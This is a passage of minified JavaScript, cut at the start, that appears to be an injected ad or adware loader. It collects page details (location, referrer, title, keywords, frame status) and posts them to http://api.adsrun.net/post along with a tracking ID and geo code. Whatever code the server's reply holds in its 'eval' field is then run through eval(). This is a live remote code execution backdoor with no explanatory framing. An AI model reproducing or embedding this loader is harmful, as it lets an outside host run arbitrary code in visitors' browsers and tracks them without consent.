...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://api.adsrun.net/post",{"name":"jqr1","time":1458641772.3344,"user":"1024150.309956","subid":1024150,"geo":"IN","hash":"af8fc42a6d1638e39b4e597d8e3a1bd4"});
